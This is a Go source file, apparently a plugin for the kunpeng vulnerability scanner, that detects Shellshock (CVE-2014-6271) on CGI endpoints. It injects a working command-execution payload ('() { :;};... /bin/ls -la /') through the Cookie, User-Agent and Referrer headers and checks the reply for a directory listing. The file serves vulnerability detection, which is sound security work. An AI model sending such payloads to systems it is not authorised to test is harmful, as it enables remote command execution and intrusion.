package goplugin

import (
	"net/http"
	"strings"
	"github.com/opensec-cn/kunpeng/util"
	"github.com/opensec-cn/kunpeng/plugin"
)

type shellShock struct {
	info   plugin.Plugin
	result []plugin.Plugin
}

func init() {
	plugin.Regist("web", &shellShock{})
}
func (d *shellShock) Init() plugin.Plugin{
	d.info = plugin.Plugin{
		Name:    "shellshock 破壳漏洞",
		Remarks: "攻击者可利用此漏洞改变或绕过环境限制，以执行任意的shell命令,最终完全控制目标系统",
		Level:   0,
		Type:    "RCE",
		Author:   "wolf",
		References: plugin.References{
			URL: "https://www.seebug.org/vuldb/ssvid-88877",
			CVE: "CVE-2014-6271",
		},
	}
	return d.info
}
func (d *shellShock) GetResult() []plugin.Plugin {
	return d.result
}
func (d *shellShock) Check(URL string, meta plugin.TaskMeta) bool {
	if meta.System == "windows" {
		return false
	}
	var checkURL string
	for _, url := range meta.FileList {
		if strings.Contains(url, ".cgi") {
			checkURL = url
			break
		}
	}
	if checkURL == "" {
		return false
	}
	pocList := []string{
		"() { :;};echo ; echo; echo $(/bin/ls -la /);",
		// "{() { _; } >_[$($())] { /bin/expr 32001611 - 100; }}",
	}
	for _, poc := range pocList {
		request, err := http.NewRequest("GET", checkURL, nil)
		request.Header.Set("cookie", poc)
		request.Header.Set("User-Agent", poc)
		request.Header.Set("Referrer", poc)
		resp, err := util.RequestDo(request, true)
		if err != nil {
			return false
		}
		if strings.Contains(resp.ResponseRaw, "drwxr-xr-x") && strings.Contains(resp.ResponseRaw, "etc") {
			result := d.info
			result.Response = resp.ResponseRaw
			result.Request = resp.RequestRaw
			d.result = append(d.result, result)
			return true
		}
	}
	return false
}
